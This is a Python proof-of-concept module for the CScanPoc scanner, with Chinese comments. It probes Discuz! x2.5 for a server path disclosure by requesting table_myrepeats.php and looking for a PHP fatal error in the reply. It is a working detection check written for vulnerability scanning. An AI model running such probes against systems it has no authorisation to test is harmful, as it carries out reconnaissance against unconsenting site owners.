# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0030'  # 平台漏洞编号，留空
    name = 'Discuz! x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2012-11-27'  # 漏洞公布时间
    desc = '''
        Discuz! x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径
    '''  # 漏洞描述
    ref = 'https://www.2cto.com/article/201211/171301.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'x2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a581d9f3-56b7-4307-8317-951aa4a7c902'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+'/source/plugin/myrepeats/table/table_myrepeats.php'
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<b>Fatal error</b>:' in content and '/table_myrepeats.php</b>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
